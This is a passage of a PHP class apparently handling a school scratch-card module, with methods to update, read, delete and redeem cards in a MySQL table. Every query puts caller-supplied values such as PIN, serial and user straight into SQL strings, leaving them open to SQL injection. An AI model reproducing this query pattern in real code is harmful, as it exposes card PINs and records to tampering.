    return $news;
  }

  /**This method is used to update the details of the generated card*/
  public static function Update($id,$serial,$pin,$status,$user,$session,$term){
    
      $query=mysqli_query(dbass::Connect(),"UPDATE cards set `serial`='$serial', pin='$pin', status='$status', user='$user', session='$session', term='$term' where id='$id'");
      if($query)
        $news=true;
      else
        $news=false;
    
      return $news;
  }

  /**This method is used Read Details of Scratch Card*/
  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['serial']=$res['serial'];
        $news['school_id']=$res['school_id'];
        $news['pin']=$res['pin'];
        $news['id']=$res['id'];
        $news['status']=$res['status'];
        $news['user']=$res['user'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
      }
      
      return $news;
  }

  /**This method is used to remove a Scratch Card*/
  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from cards where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /**This method is used for consuming a Scratch Card*/
  public static function UseCard($pin,$serial,$status,$user,$session,$term){
      $query=mysqli_query(dbass::Connect(),"UPDATE  cards set user='$user', status='$status', session='$session', term='$term' where pin='$pin' and `serial`='$serial'");
      if($query)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /**This method is used Read Details of Scratch Card User*/
  public static function User($pin,$serial,$user){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where pin='$pin' and `serial`='$serial' and status='Used' and user='$user'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  //Scratch Card Module Ends
}